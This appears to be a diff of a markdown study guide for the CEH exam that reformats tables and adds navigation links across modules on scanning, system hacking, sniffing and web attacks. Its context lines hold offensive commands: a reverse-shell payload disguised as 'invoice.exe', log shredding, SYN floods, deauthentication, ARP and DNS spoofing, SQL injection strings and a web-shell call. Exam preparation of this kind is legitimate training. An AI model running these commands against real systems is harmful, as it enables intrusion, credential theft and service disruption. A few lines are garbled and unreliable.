@@ -1,27 +1,31 @@
 
 ## Table of Contents
-- [Module 03: Scanning Networks](#module-03-scanning-networks)
-- [Module 04: Enumeration](#module-04-enumeration)
-- [Module 05: Vulnerability Analysis](#module-05-vulnerability-analysis)
-- [Module 06: System Hacking](#module-06-system-hacking)
-- [Module 07: Malware Threats](#module-07-malware-threats)
-- [Module 08: Sniffing](#module-08-sniffing)
-- [Module 09: Social Engineering](#module-09-social-engineering)
-- [Module 10: Denial-of-Service](#module-10-denial-of-service)
-- [Module 11: Session Hijacking](#module-11-session-hijacking)
-- [Module 12: Evading IDS/IPS](#module-12-evading-idsips)
-- [Module 13: Hacking Web Servers](#module-13-hacking-web-servers)
-- [Module 14: Hacking Web Applications](#module-14-hacking-web-applications)
-- [Module 15: SQL Injection](#module-15-sql-injection)
-- [Module 16: Hacking Wireless Networks](#module-16-hacking-wireless-networks)
-- [Module 17: Hacking Mobile Platforms](#module-17-hacking-mobile-platforms)
-- [Module 18: IoT and OT Hacking](#module-18-iot-and-ot-hacking)
-- [Module 20: Cryptography](#module-20-cryptography)
-- [Appendix: Tools Cheatsheet](#appendix-tools-cheatsheet)
+^top
+- [[CEH Walkthrough#^mod03 | Module 03: Scanning Networks]]
+- [[CEH Walkthrough#^mod04 | Module 04 Enumeration]]
+- [[CEH Walkthrough#^mod05 | Module 05 Vulnerability Analysis]]
+- [[CEH Walkthrough#^mod06 | Module 06 System Hacking]]
+- [[CEH Walkthrough#^mod07 | Module 07 Malware Threats]]
+- [[CEH Walkthrough#^mod08 | Module 08 Sniffing]]
+- [[CEH Walkthrough#^mod09 | Module 09 Social Engineering]]
+- [[CEH Walkthrough#^mod10 | Module 10 Denial-of-Service]]
+- [[CEH Walkthrough#^mod11 | Module 11 Session Hijacking]]
+- [[CEH Walkthrough#^mod12 | Module 12 Evading IDS/IPS]]
+- [[CEH Walkthrough#^mod13 | Module 13 Hacking Web Servers]]
+- [[CEH Walkthrough#^mod14 | Module 14 Hacking Web Applications]]
+- [[CEH Walkthrough#^mod15 | Module 15 SQL Injection]]
+- [[CEH Walkthrough#^mod16 | Module 16 Hacking Wireless Networks]]
+- [[CEH Walkthrough#^mod17 | Module 17 Hacking Mobile Platforms]]
+- [[CEH Walkthrough#^mod18 | Module 18 IoT and OT Hacking]]
+- [[CEH Walkthrough#^mod20 | Module 20 Cryptography (CEH Exam Focused)]]
+- [[CEH Walkthrough#^apdx | Appendix Tools Cheatsheet]]
+
 
 ---
 
-# Module 03: Scanning Networks
+## Module 03: Scanning Networks
+^mod03
+
 ### Host Discovery (Exam Weight: 30%)
 
  ARP Ping Scan (LAN)
@@ -130,7 +134,10 @@ nmap -sn -PR 192.168.1.0/24
 nmap -sS -T4 -p- -v 10.10.10.10
 nmap -A --script=http-enum 10.10.10.10
 
-# Module 04: Enumeration
+[[CEH Walkthrough#^top|Back to top]]
+___
+## Module 04: Enumeration
+^mod04
 
 ### NetBIOS/SMB Enumeration (Exam Weight: 30%)
 ```
@@ -177,12 +184,12 @@ dnsrecon -d example.com -t axfr,std
 ```
 ###  Exam-Critical Reference Table
 
-|Service|Tool|Command Example|Key Flags/Notes|
-|---|---|---|---|
-|SMB|enum4linux|`-a` for all checks|Always try null session first|
-|SNMP|snmpwalk|`-c public -v1`|Check MIB 1.3.6.1.2.1.25.*|
-|LDAP|ldapsearch|`-x` for simple auth|Base DN required|
-|DNS|dig|`axfr` for zone transfer|Test all NS servers|
+| Service | Tool       | Command Example          | Key Flags/Notes               |
+| ------- | ---------- | ------------------------ | ----------------------------- |
+| SMB     | enum4linux | `-a` for all checks      | Always try null session first |
+| SNMP    | snmpwalk   | `-c public -v1`          | Check MIB 1.3.6.1.2.1.25.*    |
+| LDAP    | ldapsearch | `-x` for simple auth     | Base DN required              |
+| DNS     | dig        | `axfr` for zone transfer | Test all NS servers           |
 
 ### Practical Exam Checklist
 
@@ -226,7 +233,10 @@ snmpwalk -c public -v1 10.10.10.10
 nmap -p 445 --script=smb-enum-shares 10.10.10.10
 dig axfr @10.10.10.10 example.com
 
-# Module 05: Vulnerability Analysis
+[[CEH Walkthrough#^top|Back to top]]
+___
+## Module 05: Vulnerability Analysis
+^mod05
 
 ### Vulnerability Scanning Tools (Exam Weight: 40%)
 ```
@@ -265,12 +275,12 @@ nmap -p 80 --script=http-default-accounts 10.10.10.10
 ```
 ### Exam-Critical Reference Table
 
-|Tool|Command Example|Key Flags|Output Analysis Tips|
-|---|---|---|---|
-|Nikto|`-Tuning x5678`|x=File, 5=Injection|Check for "OSVDB" IDs|
-|OpenVAS|`omp -u admin -w pass -X '<create_target><name>...</create_target>'`|XML formatted|Look for CVSS >7.0|
-|Nmap Vuln|`--script=vuln`|Combine with `-p-`|"VULNERABLE" tags|
-|Hydra|`-vV` for verbose|`-t 4` for threads|"login:password" format|
+| Tool      | Command Example                                                      | Key Flags           | Output Analysis Tips    |
+| --------- | -------------------------------------------------------------------- | ------------------- | ----------------------- |
+| Nikto     | `-Tuning x5678`                                                      | x=File, 5=Injection | Check for "OSVDB" IDs   |
+| OpenVAS   | `omp -u admin -w pass -X '<create_target><name>...</create_target>'` | XML formatted       | Look for CVSS >7.0      |
+| Nmap Vuln | `--script=vuln`                                                      | Combine with `-p-`  | "VULNERABLE" tags       |
+| Hydra     | `-vV` for verbose                                                    | `-t 4` for threads  | "login:password" format |
 
 ### Practical Exam Checklist
 
@@ -310,10 +320,10 @@ nmap -p 80,443 --script=vuln 10.10.10.10
 hydra -L users.txt -P passwords.txt ssh://10.10.10.10
 gvm-cli socket --xml "<get_version/>"
 
-
----
-
-# Module 06: System Hacking
+[[CEH Walkthrough#^top|Back to top]]
+___
+## Module 06: System Hacking
+^mod06
 
 ### 1. Password Cracking (Exam Weight: 30%)
 ```
@@ -367,12 +377,12 @@ shred -zu /var/log/auth.log
 
 ### Exam-Critical Reference Table
 
-|Technique|Tool|Command Example|Key Flags|
-|---|---|---|---|
-|Hash Extraction|mimikatz|`sekurlsa::logonpasswords`|Requires admin|
-|Password Cracking|hashcat|`-m 1000` for NTLM|`--force` for GPU|
-|Privilege Escal|linpeas.sh|`./linpeas.sh`|Look for yellow/red|
-|Persistence|metasploit|`run persistence -X`|`-i` for interval|
+| Technique         | Tool       | Command Example            | Key Flags           |
+| ----------------- | ---------- | -------------------------- | ------------------- |
+| Hash Extraction   | mimikatz   | `sekurlsa::logonpasswords` | Requires admin      |
+| Password Cracking | hashcat    | `-m 1000` for NTLM         | `--force` for GPU   |
+| Privilege Escal   | linpeas.sh | `./linpeas.sh`             | Look for yellow/red |
+| Persistence       | metasploit | `run persistence -X`       | `-i` for interval   |
 
 ### Practical Exam Checklist
 
@@ -412,10 +422,10 @@ hashcat -m 1000 ntlm_hashes.txt rockyou.txt --force
 meterpreter > getsystem
 ./linpeas.sh -t
 
-
----
-
+[[CEH Walkthrough#^top|Back to top]]
+___
 ## Module 07: Malware Threats
+^mod07
 
 ### 1. Trojan Analysis (Exam Weight: 25%)
 ```
@@ -467,12 +477,12 @@ strace -f -o trace.log ./malware
 
 ### Exam-Critical Reference Table
 
-|Technique|Tool|Command Example|Key Indicators|
-|---|---|---|---|
-|Static Analysis|strings|`strings -el malware.exe`|URLs, IPs, passwords|
-|Dynamic Analysis|Procmon|Filter: "Process Name = malware.exe"|Registry writes, file drops|
-|RAT Detection|Netstat|`netstat -ano`|Unusual ports (5555, 9876)|
-|YARA Scanning|yara|`yara -s rules.yar file.exe`|Rule matches|
+| Technique        | Tool    | Command Example                      | Key Indicators              |
+| ---------------- | ------- | ------------------------------------ | --------------------------- |
+| Static Analysis  | strings | `strings -el malware.exe`            | URLs, IPs, passwords        |
+| Dynamic Analysis | Procmon | Filter: "Process Name = malware.exe" | Registry writes, file drops |
+| RAT Detection    | Netstat | `netstat -ano`                       | Unusual ports (5555, 9876)  |
+| YARA Scanning    | yara    | `yara -s rules.yar file.exe`         | Rule matches                |
 
 ### Practical Exam Checklist
 
@@ -512,10 +522,10 @@ netstat -ano | findstr "5555"
 diec suspicious_file.exe
 yara -r rules.yar malware_sample
 
-
----
-
+[[CEH Walkthrough#^top|Back to top]]
+___
 ## Module 08: Sniffing
+^mod08
 
 ### Passive Sniffing Techniques (Exam Weight: 30%)
 ```
@@ -568,12 +578,12 @@ tshark -r capture.pcap --export-objects "http,./exported_files"
 
 ### Exam-Critical Reference Table
 
-|Technique|Tool|Command Example|Key Filters|
-|---|---|---|---|
-|Passive Sniffing|tcpdump|`-nn -vv -c 100`|'port 80'|
-|ARP Spoofing|ettercap|`-T -q -M arp`|arp.duplicate-address|
-|SSL Stripping|sslstrip|`-a -f -k`|http contains "login"|
-|VoIP Capture|wireshark|`udp.port == 5060`|sip||rtp|
+| Technique        | Tool      | Command Example    | Key Filters           |     |     |
+| ---------------- | --------- | ------------------ | --------------------- | --- | --- |
+| Passive Sniffing | tcpdump   | `-nn -vv -c 100`   | 'port 80'             |     |     |
+| ARP Spoofing     | ettercap  | `-T -q -M arp`     | arp.duplicate-address |     |     |
+| SSL Stripping    | sslstrip  | `-a -f -k`         | http contains "login" |     |     |
+| VoIP Capture     | wireshark | `udp.port == 5060` | sip                   |     | rtp |
 
 ### Practical Exam Checklist
 
@@ -612,9 +622,11 @@ arpspoof -i eth0 -t victim_ip gateway_ip
 wireshark -Y "http.request.method == POST"
 ettercap -T -q -i eth0 -M arp
 
----
-
+[[CEH Walkthrough#^top|Back to top]]
+___
 ## Module 09: Social Engineering
+^mod09
+
 ```
 # SET Toolkit
 setoolkit
@@ -628,9 +640,10 @@ setoolkit
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP -f exe > invoice.exe
 ```
 
----
-
+[[CEH Walkthrough#^top|Back to top]]
+___
 ## Module 10: Denial-of-Service
+^mod10
 
 ### Network Layer DoS Attacks (Exam Weight: 40%)
 ```
@@ -669,12 +682,12 @@ tcpdump -nni eth0 'icmp[icmptype] = icmp-echo' -c 100 | awk '{print $3}' | sort 
 ```
 ### Exam-Critical Reference Table
 
-|Attack Type|Tool|Command Example|Key Flags|
-|---|---|---|---|
-|SYN Flood|hping3|`-S --flood -a spoofed_ip`|Random source IP|
-|HTTP Slow|slowhttptest|`-c connections -i interval`|`-H` for Hold|
-|Wireless DoS|mdk4|`b -n "FakeAP" -s 1000`|Channel hopping|
-|DNS Amplification|hping3|`-2 -p 53 --data 1000`|UDP protocol|
+| Attack Type       | Tool         | Command Example              | Key Flags        |
+| ----------------- | ------------ | ---------------------------- | ---------------- |
+| SYN Flood         | hping3       | `-S --flood -a spoofed_ip`   | Random source IP |
+| HTTP Slow         | slowhttptest | `-c connections -i interval` | `-H` for Hold    |
+| Wireless DoS      | mdk4         | `b -n "FakeAP" -s 1000`      | Channel hopping  |
+| DNS Amplification | hping3       | `-2 -p 53 --data 1000`       | UDP protocol     |
 
 ### Practical Exam Checklist
 
@@ -714,9 +727,10 @@ slowhttptest -c 1000 -H -u http://10.10.10.10
 aireplay-ng --deauth 100 -a AP:MAC wlan0mon
 netstat -n -p tcp | grep SYN_RECV
 
----
-
-# Module 11: Session Hijacking
+[[CEH Walkthrough#^top|Back to top]]
+___
+## Module 11: Session Hijacking
+^mod11
 
 ### TCP Session Hijacking (Exam Weight: 25%)
 
@@ -766,12 +780,12 @@ curl -v -c cookies.txt http://test.com/login.php?SESSID=HACKED
 
 ###  Exam-Critical Reference Table
 
-|Attack Type|Tool|Command Example|Detection Method|
-|---|---|---|---|
-|ARP Spoofing|arpspoof|`arpspoof -i eth0 -t victim gateway`|ARP watch|
-|TCP Hijacking|hping3|`hping3 -S -p 80 --flood`|SEQ number analysis|
-|Cookie Theft|Burp Suite|Intercept "Set-Cookie" header|HTTPS enforcement|
-|DNS Spoofing|ettercap|`ettercap -T -q -i eth0 -M dns`|DNSSEC validation|
+| Attack Type   | Tool       | Command Example                      | Detection Method    |
+| ------------- | ---------- | ------------------------------------ | ------------------- |
+| ARP Spoofing  | arpspoof   | `arpspoof -i eth0 -t victim gateway` | ARP watch           |
+| TCP Hijacking | hping3     | `hping3 -S -p 80 --flood`            | SEQ number analysis |
+| Cookie Theft  | Burp Suite | Intercept "Set-Cookie" header        | HTTPS enforcement   |
+| DNS Spoofing  | ettercap   | `ettercap -T -q -i eth0 -M dns`      | DNSSEC validation   |
 
 ### Practical Exam Checklist
 
@@ -802,8 +816,10 @@ arpspoof -i eth0 -t victim_ip router_ip
 ettercap -T -q -i eth0 -M arp /victim_ip// /router_ip//
 tcpdump -i eth0 'tcp[13] & 2 != 0' -vv
 
-
-# Module 12: Evading IDS/IPS
+[[CEH Walkthrough#^top|Back to top]]
+___
+## Module 12: Evading IDS/IPS
+^mod12
 
 ## Nmap Fragmentation
 ```
@@ -861,12 +877,12 @@ ptunnel -p 10.10.10.10 -lp 1080 -da 192.168.1.100 -dp 22
 
 ### Exam-Critical Reference Table
 
-|Technique|Tool|Command Example|Detection Bypass|
-|---|---|---|---|
-|Packet Fragmentation|Nmap|`nmap -f --mtu 24`|Defeats simple packet inspection|
-|Payload Encoding|MSFVenom|`-e x86/shikata_ga_nai`|Anti-virus evasion|
-|Protocol Tunneling|Ptunnel|`ptunnel -p attacker_ip`|ICMP whitelisting|
-|Time Delay|Nmap|`--scan-delay 5s`|Throttle-based detection|
+| Technique            | Tool     | Command Example          | Detection Bypass                 |
+| -------------------- | -------- | ------------------------ | -------------------------------- |
+| Packet Fragmentation | Nmap     | `nmap -f --mtu 24`       | Defeats simple packet inspection |
+| Payload Encoding     | MSFVenom | `-e x86/shikata_ga_nai`  | Anti-virus evasion               |
+| Protocol Tunneling   | Ptunnel  | `ptunnel -p attacker_ip` | ICMP whitelisting                |
+| Time Delay           | Nmap     | `--scan-delay 5s`        | Throttle-based detection         |
 
 ### Practical Exam Checklist
 
@@ -891,10 +907,10 @@ ptunnel -p 10.10.10.10 -lp 1080 -da 192.168.1.100 -dp 22
     
 - **Must-know encoders**: `shikata_ga_nai`, `call4_dword_xor`
 
-
----
-
-# Module 13: Hacking Web Servers
+[[CEH Walkthrough#^top|Back to top]]
+___
+## Module 13: Hacking Web Servers
+^mod13
 
 ### 1. Web Server Fingerprinting (Exam Weight: 20%)
 
@@ -947,12 +963,12 @@ nmap --script=http-methods 10.10.10.10
 
 ### Exam-Critical Reference Table
 
-|Attack Type|Tool|Command Example|Detection Method|
-|---|---|---|---|
-|Banner Grabbing|Netcat|`nc -nv 10.10.10.10 80`|Server header analysis|
-|FTP Brute Force|Hydra|`hydra -L users.txt ftp://10.10.10.10`|Failed login monitoring|
-|Shellshock|cURL|`curl -H "malicious-header"`|CGI script auditing|
-|Heartbleed|Nmap|`nmap --script=ssl-heartbleed`|OpenSSL patching|
+| Attack Type     | Tool   | Command Example                        | Detection Method        |
+| --------------- | ------ | -------------------------------------- | ----------------------- |
+| Banner Grabbing | Netcat | `nc -nv 10.10.10.10 80`                | Server header analysis  |
+| FTP Brute Force | Hydra  | `hydra -L users.txt ftp://10.10.10.10` | Failed login monitoring |
+| Shellshock      | cURL   | `curl -H "malicious-header"`           | CGI script auditing     |
+| Heartbleed      | Nmap   | `nmap --script=ssl-heartbleed`         | OpenSSL patching        |
 
 ### Practical Exam Checklist
 
@@ -990,9 +1006,11 @@ nmap --script=http-methods 10.10.10.10
 whatweb http://10.10.10.10
 nikto -h http://10.10.10.10 -Tuning xbhydra -L users.txt -P passwords.txt ftp://10.10.10.10
 
----
-
+[[CEH Walkthrough#^top|Back to top]]
+___
 ## Module 14: Hacking Web Applications
+^mod14
+
 ```
 # SQL Injection (Manual)
 ' OR 1=1 -- -
@@ -1001,9 +1019,10 @@ nikto -h http://10.10.10.10 -Tuning xbhydra -L users.txt -P passwords.txt ftp://
 sqlmap -u "http://test.com?id=1" --risk=3 --level=5 --dbs
 ```
 
----
-
+[[CEH Walkthrough#^top|Back to top]]
+___
 ## Module 15: SQL Injection
+^mod15
 ### 1. Web App Reconnaissance (Exam Weight: 20%)
 ```
 # Directory Bruteforcing
@@ -1062,12 +1081,12 @@ curl http://10.10.10.10/uploads/shell.php?cmd=id
 
 ### Exam-Critical Reference Table
 
-|Attack Type|Tool|Command Example|Detection Method|
-|---|---|---|---|
-|Brute Force|Hydra|`http-post-form` target syntax|Failed login monitoring|
-|SQL Injection|SQLmap|`--risk=3 --level=5`|WAF rule analysis|
-|XSS|Manual Testing|`<script>alert()</script>`|Input sanitization checks|
-|File Upload|cURL|`-F` for form submission|MIME type verification|
+| Attack Type   | Tool           | Command Example                | Detection Method          |
+| ------------- | -------------- | ------------------------------ | ------------------------- |
+| Brute Force   | Hydra          | `http-post-form` target syntax | Failed login monitoring   |
+| SQL Injection | SQLmap         | `--risk=3 --level=5`           | WAF rule analysis         |
+| XSS           | Manual Testing | `<script>alert()</script>`     | Input sanitization checks |
+| File Upload   | cURL           | `-F` for form submission       | MIME type verification    |
 
 ### Practical Exam Checklist
 
@@ -1106,9 +1125,10 @@ gobuster dir -u http://10.10.10.10 -w wordlist.txt
 hydra -l admin -P rockyou.txt http-post-form "/login.php..."
 sqlmap -u "http://10.10.10.10/products?id=1" --dbs
 
----
-
+[[CEH Walkthrough#^top|Back to top]]
+___
 ## Module 16: Hacking Wireless Networks
+^mod16
 
 ### 1. Wireless Reconnaissance (Exam Weight: 25%)
 ```
@@ -1158,12 +1178,12 @@ l2ping -i hci0 -s 600 -f TARGET:MAC
 ```
 ### Exam-Critical Reference Table
 
-|Attack Type|Tool|Command Example|Key Flags|
-|---|---|---|---|
-|Handshake Capture|airodump-ng|`--bssid`, `-w capture`|Must use `wlan0mon`|
-|WPA Cracking|aircrack-ng|`-a2` for WPA, `-w` wordlist|Requires .cap file|
-|WPS Brute Force|reaver|`-K 1` for Pixie Dust attack|`-vv` for verbose|
-|Evil Twin|airbase-ng|`--essid` for clone name|Channel must match|
+| Attack Type       | Tool        | Command Example              | Key Flags           |
+| ----------------- | ----------- | ---------------------------- | ------------------- |
+| Handshake Capture | airodump-ng | `--bssid`, `-w capture`      | Must use `wlan0mon` |
+| WPA Cracking      | aircrack-ng | `-a2` for WPA, `-w` wordlist | Requires .cap file  |
+| WPS Brute Force   | reaver      | `-K 1` for Pixie Dust attack | `-vv` for verbose   |
+| Evil Twin         | airbase-ng  | `--essid` for clone name     | Channel must match  |
 
 ### Practical Exam Checklist
 
@@ -1203,9 +1223,11 @@ airodump-ng wlan0mon
 aireplay-ng --deauth 10 -a AP:MAC wlan0mon
 aircrack-ng -a2 -w rockyou.txt capture-01.cap
 
----
-
+[[CEH Walkthrough#^top|Back to top]]
+___
 ## Module 17: Hacking Mobile Platforms
+^mod17
+
 ```
 ### ADB (Android Debug Bridge) Essentials
 
@@ -1256,8 +1278,10 @@ bettercap -iface wlan0
     
 - **Burp Mobile Setup**: Configure proxy to intercept mobile app traffic (port 8080)
 
----
+[[CEH Walkthrough#^top|Back to top]]
+___
 ## Module 18: IoT and OT Hacking
+^mod18
 
 ### IoT Protocol Attacks
 ```
@@ -1324,7 +1348,10 @@ shodan search port:1883 MQTT
 | **CANBus**       | `candump can0`                          | Vehicle network sniffing         |
 | **RouterSploit** | `rsf.py`                                | Embedded device exploitation     |
 
-## 🔐 Module 20: Cryptography (CEH Exam Focused)
+[[CEH Walkthrough#^top|Back to top]]
+___
+## Module 20: Cryptography (CEH Exam Focused)
+^mod20
 
 ### 1. File Encryption with VeraCrypt
 
@@ -1398,13 +1425,13 @@ openssl x509 -in cert.pem -text -noout
 ```
 ### 6. Password Cracking Cheatsheet
 
-|Hash Type|John Format|Hashcat Mode|
-|---|---|---|
-|MD5|`raw-md5`|`0`|
-|SHA1|`raw-sha1`|`100`|
-|NTLM|`nt`|`1000`|
-|SHA-256|`raw-sha256`|`1400`|
-|AES Encrypted File|`aes-256-encrypted`|N/A|
+| Hash Type          | John Format         | Hashcat Mode |
+| ------------------ | ------------------- | ------------ |
+| MD5                | `raw-md5`           | `0`          |
+| SHA1               | `raw-sha1`          | `100`        |
+| NTLM               | `nt`                | `1000`       |
+| SHA-256            | `raw-sha256`        | `1400`       |
+| AES Encrypted File | `aes-256-encrypted` | N/A          |
 
 ### Exam-Critical Notes:
 
@@ -1451,7 +1478,10 @@ john --format=raw-md5 hash.txt --wordlist=rockyou.txt
 steghide extract -sf image.jpg -p "password"
 ```
 
-## Appendix: Tools Cheatsheet
+[[CEH Walkthrough#^top|Back to top]]
+___
+## Appendix: Tools Cheat sheet
+^apdx
 
 | Tool       | Command Example                           | Purpose                |
 | ---------- | ----------------------------------------- | ---------------------- |
@@ -1461,6 +1491,7 @@ steghide extract -sf image.jpg -p "password"
 | Wireshark  | `tcp.port == 3389`                        | RDP traffic analysis   |
 | John       | `john --format=NT hash.txt`               | Password cracking      |
 | SQLmap     | sqlmap -u "http://test.com?id=1" --risk=3 | Automated SQLi         |
+[[CEH Walkthrough#^top|Back to top]]
 
 
 
